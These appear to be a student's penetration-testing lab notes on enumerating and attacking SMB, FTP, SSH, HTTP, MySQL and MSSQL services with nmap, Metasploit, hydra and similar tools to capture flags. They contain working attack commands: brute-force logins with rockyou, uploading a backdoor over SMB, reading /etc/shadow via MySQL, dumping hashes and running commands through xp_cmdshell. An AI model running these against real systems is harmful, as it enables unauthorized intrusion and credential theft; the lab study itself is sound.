
  **Port Scanning with Auxiliary modules(msfconsole)**

   - search portscan, provide a RHOSTS. Run a scan. With CURL we can see a webpage that runs a service XODA
   - We search Xoda in msf and there we give rhosts and TARGETURI (/ - home directory). We got a meterpreter session when we ran the exploit.
   - Sysinfo - to see information
   ![alt text](<Pasted image 20250824143031.png>)
   - we run commands :
	   - shell
	   - /bin/bash -i
	   - ifconfig
	   - We see that there is another subnet which means there is another target on the network.
	   - We can add a route. **run autoroute  -s 192.112.143.2 ![alt text](<Pasted image 20250824143317.png>)
	   - background
	   - use portscan again(change last digit of ip to 3 cause it's a new target)
	   - udp_sweep module can be used for udp scan
	   - ![alt text](<Pasted image 20250824143616.png>)
---

**SMB: Windows discover & mount**

SMB - Server Message Block

- doing nmap
    
- 445 will be SMB
    
- sV, sC for some useful information
    
- Open file explorer, right click on network, map network, insert \\ip address and connect with login and password
    
- net use * /delete to delete the connection
    

---

**SMB : nmap #scripts**

- scan with nmap
    
- smb v1 is dangerous
    

Commands:

- nmap -p445 --script smb-protocols ip

- nmap -p445 --script smb-security-mode ip

- nmap -p445 --script smb-enum-sessions ip

also you can pass arguments --script-args

For example : **smbusername=administrator,smbpassword=*anything* ip**

--script smb-enum-shares

- smb-enum-users

- smb-server-stats

- smb-enum-domains

It will never hurt to get as much info as possible during enumeration

- smb-enum-groups

- smb-enum-services

- smb-ls(you can add after script command)

  

---

**SMB : SMBMap**

- nmap scan
    
- nmap -p445 --script smb-protocols ip
    
- smbmap -u(user) guest -p "" -d . -H ip
    
- IN the video there is a login and passwd so: smbmap -u administrator -p smbserver_771 -d . -H ip
    
- to execute a command: smbmap -H ip -u ... - p ... -x 'ipconfig' (if we can execute it, it's very dangerous
    
- tag '-L' will list all content
    
- we found C drive in contents so
    
    we add -r 'C$' to connect to C drive
    
- let's create a file: touch backdoor
    
- to upload a file from our machine to the one that we attack we use
    
    --upload '/root/backdoor/' 'C$\backdoor'
    
- also we can download --download
    

---

**SMB: Samba 1**

- as usual **ip a**
    
- nmap ip
    
- ports 139 and 445 are open so smb is there
    
- nmap ip -sV -p 139,145
    
- **nmap  ip -sU(for udp) --top-port 25 --open -sV**
    
- **nmap ip -p 445 --script --smb-os-discovery**
    
- METASPLOIT next: msfconsole
    
- use auxiliary/scanner/smb/smb_version
    
- show options
    
- set rhosts ip adress
    
- run 
    
- exploit
    
- exit
    

- nmblookup -h
    
- nmblookup -A ip
    
- smbclient -h
    
- smbclient -L ip -N
    

- rpcclient -U "" -N ip
    

---

**SMB: Samba 2**

  

- nmap
    
- rpcclient -U "" -N ip
    
- srvinfo to see server info
    
- exit
    
- enum4linux(another tool) -o ip (to find operating system version)
    
- smbclient -L ip -N
    
- enum4linux -U ip (gonna get us users)
    
- Then connect through rpcclient and run enumdomusers
    
- lookupnames admin
    

---

**SAMBA 3**

- nmap as usual
    

**we gonna dive deeper**

- smb-enum-shares to look at shares in nmap
    
- use auxiliary/scanner/smb/smb_enumshares
    
- **exit**
    
- enum4linux -S(shares) ip
    
- enum4linux -G(group) ip
    
- connect to rpcclient
    
- **enumdomgroups(same output as tag G for enum4linux)**
    
- smbclient //ip/Public -N
    
- **here we can use basic linux commands, so use get to get the flag**
    

---

**Dictionary attack notes**

- nmap
    
- msfconsole
    
    use auxiliary/scanner/smb/smb_login
    
    info
    
    it's gonna test smb logins on a range of machines and report successful logins
    
    We need to pass a login file
    
- set rhosts
    
    set pass_file /usr/share/metasploit.../unix_passwords.txt
    
    set smbuser jane
    
- gzip -d /usr/share/wordlists/rockyou.txt.gz
    
- **hydra** -l admin -P (uppercase if it's a file) /urs/share/wordlists/rockyou.txt ip smb(protocol)
    
- smbmap -H -u admin -p password1
    
- smbclient -L 192.... -U jane
    
- smbclient //192.../jane -U jane
    
- same with admin -U admin
    
    cd hidden
    
    get  flag.tar.gz
    
    tar -xf flag.tar.g
    
- cat flag
    
      
    

Other services can be piped to **SMB**

- msfconsole
    
    use auxiliary/scanner/smb/pipe_auditor
    
    set smbuser admin
    
    set smbpass ppp
    
    set rhosts
    
    options (check options)
    
    run
    
- Also we can get a list of SID
    
    enum4linux -r -u "admin" -p "password1" ip
    
      
    
      
    

---

# FTP


**File Transfer Protocol - for storing files on a server**

- port 21 - service FTP
    
- nmap as usual
    
- ftp ip , it asks for login and password, we put Enter - nothing
    
- bye
    
- hydra(bruteforce) -L (for login, uppercase if you want a list) /usr/share/metasploit-framework/.../common_users.txt -P /usr/share/...(I can press double tab to see more info, files)/unix_passwords.txt  ip ftp
    
- ftp ip (now we have credentials that we can use to login)
    
- get secret.txt
    
New notes 
using msfconsole to find modules like ftp_version, proftpd, ftp_login and set username file and pass_file to do bruteforce as we did with hydra.
Another module is ftp/anonymous. Same is if we ran ftp ip

---

## FTP : Anonymous Login

- nmap
    
- ping to make sure that it's up
    
- nmap ip -p 21 -sV
    
- --script ftp-anon (common vulnerability as I understood)
    
- then **ftp =>** for login I type **anonymous,** for password press **Enter, no password**
    
- we can **get flag** now
    


---

**SSH - Secure Shell**

**Used for remote administration over an encrypted channel**

- nmap - port 22 is ssh
    
- how it works:
    
    ssh root@ip (root is a usual thing for linux machines)
    
- _We gonna use netcat now_
    
    nc ip 22(port number)
    
- It gave us a banner, just for enumeration
    
- nmap ip -p 22 --script ssh2-enum-algos
    
    It shows all the algos that can be used to create a key
    
- nmap ip --script ssh-hostkey --script-args =ssh_hostkey="full"
    
- nmap ip script ssh-auth-methods args='ssh.user = student' and then admin(write it correctly in terminal)
    
- nmap -p22 --script=ssh-run --script-args="ssh-run.cmd-cat /home/student/FLAG, ssh-run.username=student,ssh-run.password=" [192.98.12.3](http://192.98.12.3) **TO GET A FLAG**
    

---

**SSH Dictionary attack**

- nmap, ping, nmap -sV with p22
    
- gzip -d /usr/share/wordlists/rockyou.txt.gz
    
- hydra -l student -P /usr/share/wordlists/rockyou.txt ip ssh
    
- ssh student@ip
    
- echo "administrator" > user to create a database for ssh script
    
- nmap ip --script ssh-brute --script-args userdb=/root/user - brute forcing password
    
- msfconsole
    
    use auxiliary/scanner/ssh/ssh_login
    
- set rhosts
    
    set userpass_file /usr/share/wordlists/metasploitroot_userpass.txt
    
- set STOP_ON_SUCCESS true(cause it's just one username > one password)
    
    set verbose true
    
- run
    
    exit -y
    
- connect with ssh
    
    ls /
    

  

---

HTTP

**- HTTP IIS**

Important thing: I can type ip address in the browser to see what's there from the beginning

- basic nmap scan, port 80 is open(http)
    
- whatweb ip (some additional info about our server)
    
    we can test some things is there are any vulnerabilities
    
- http ip
    
- next tool is **dirb http:// our ip address (for ex. [http://10.4.18.97](http://10.4.18.97)**
    
    **It's looking for directories and subdirectories**
    
- Another tool is
    
    **browsh --startup-url http:// ...**
    

---

**HTTP IIS Nmap Scripts**

- nmap, nmap -sV, insert ip in browser
    
- nmap ip -p 80 --script http-enum(similar to dirb, directories)
    

- ... --script http-headers
    
- --script hhtp-methods --scrpit-args http-methods.url-path=/webdav/
    
    http-webdav-scan with same arguments
    

---

**HTTP APACHE( LINUX )**

- nmap; nmap -p80 -sV
    
- nmap -p80 -script banner
    
    **banner is** the first info that computer gets when connecting to other machine remotely
    
- Let's jump into msfconsole
    
    use auxiliary/scanner/http/http_version
    
    **set** RHOSTS
    
    run
    
- **curl** ip | more
    
    **Curl** is a command-line tool to transfer data to or from a server, using any of the supported protocols (HTTP, FTP, IMAP, POP3, SCP, SFTP, SMTP, TFTP, TELNET, LDAP, or FILE).
    
    Display the content of the url on the terminal.
    
- **wget** (it retrieves web file)
    
    **wget** "[http://192.32.62.3/index](http://192.32.62.3/index)" (it's usually a home page)
    
    cat index | more
    
- **browsh --**startup-url 192.32.62.3 (it shows web page on the terminal)
    
    CTRL + W to get out of there
    
- **lynx** http://... similar to what the previous one did
    
- **msfconsole**
    
    **use auxiliary/scanner/http/brute_dirs**
    
- **dirb** http:... /usr/share/metasploit-framework/ ../ directory.txt
    

- msfconsole
    
    **show**
    
- use auxiliary/scanner/http/robots_txt
    
    set RHOSTS
    
    options (always check options just in case)
    
    run
    
    curl http://.../cgi-bin/ | more (**I DON"T KNOW what is it yet, need to google)**
    

---

**MySQL Databases**

- 3306 port - MySQL
    
- mysql -h ip -u(for username) root
    
- We were able to login and we can look at databases
    
    **show databases**
    
    **> ;**
    
- **use books;**
    
    **select count * from authors;**
    
- msfconsole
    
    use auxiliary/scanner/mysql/mysql_writable_dirs
    
    set dir_list /usr/share/metasploit-framework/data/wordlists/director
    
    setg rhosts(as a global var)
    
    setg verbose false
    
    advanced(just looking)
    
    set password ""
    
    run
    
- use auxiliary/scanner/mysql/mysql_hashdump
    
    host is set cause we had global var
    
    set username root
    
    set password ""
    
- back to MySQL
    
    mysql -h ip -u root
    
- select load_file ("/etc/shadow");
    
- exit
    
- nmap ip p3306 -sV --script=mysql-empty-password
    
- for more info --script=mysql-info
    
- --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"
    
- mysql-databases
    
- variables
    
- mysql-audit instead of mysqluser we put mysql-audit.username,mysql-audit.password, mysql-audit.filename=...
    

---

**MySQL Dictionary attack**

- nmap, 3306, we're running server scan -sV
    

- bruteforcing login with msfconsole:
    
    msfconsole
    
    use auxiliary/scanner/mysql/mysql_login
    
    set rhosts ip
    
    set pass_file /usr/.../unix_paswords.txt
    
    set verbose false
    
    set stop_on_success true
    
    set username root
    
    run
    
    exit
    

- **hydra -l (username) -P /usr../unix... ip mysql**
    
- These are nice tools!!!
    

---

**MSSql Nmap Scripts - Microsoft Sql**

- running nmap, -sV
    
- **PORT 1433**
    
- nmap ip -p1433 --script ms-sql-info
    
- [NTLM MSSql vulnerability](https://www.bing.com/ck/a?!&&p=de071cc5b4737726JmltdHM9MTY5NTg1OTIwMCZpZ3VpZD0yYmFmZjlmMy1kNzMzLTYyMDctMjdiMi1lYTdkZDY2MzYzNTImaW5zaWQ9NTIwOA&ptn=3&hsh=3&fclid=2baff9f3-d733-6207-27b2-ea7dd6636352&psq=what+is+ntlm+mssql&u=a1aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3NxbC9jb25uZWN0L2pkYmMvdXNpbmctbnRsbS1hdXRoZW50aWNhdGlvbi10by1jb25uZWN0LXRvLXNxbC1zZXJ2ZXI_dmlldz1zcWwtc2VydmVyLXZlcjE2&ntb=1)
    
- --script ms-sql-ntlm-info --script-args mssql,instance-port=1433
    
- --script ms-sql-brute --script-args userdb=/root/Desktop/wordlists/common_users.txt,passdb=/root...,txt
    
- ms-sql-empty-password
    
- ms-sql-query args mssql.username=admin,mssql.password=something,ms-sql-query.query="SELECT * FROM master ..syslogins" -oN(because input is not normal) output.txt
    
- We go to root and open output.txt - easier to read.
    
- --script  ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria
    
- --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig"
    
- --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt"
    
- ![](en-cache://tokenKey%3D%22AuthToken%3AUser%3A222269044%22+ee3723d8-1fdb-2459-ba4d-7d979eb40951+1dec350b6d147f9cf88193cd9d6a6622+https://public.www.evernote.com/resources/s611/3251942f-4c91-a9a9-85ee-d1200de74bab)
    

---

  

**Mssql - Metasploit**

- nmap -p1433 -sV --script ms-sql-info
    
- msfconsole
    
    use auxiliary/scanner/mssql/mssql_login
    
    setg rhosts
    
    set user_file /root/Desktop/wordlists/common_users.txt
    
    set pass_file /root/Desktop/wordlists/100-common-passwords.txt
    
    set verbose false
    
    run
    
- use auxiliary/admin/mssql/mssql_enum - run
    
- use auxiliary/admin/mssql/mssql_enum_sql_logins
    
- use auxiliary/admin/mssql/mssql_exec(to check if we can run commands
    
    set cmd whoami
    
- use auxiliary/admin/mssql/mssql_enum_domain_accounts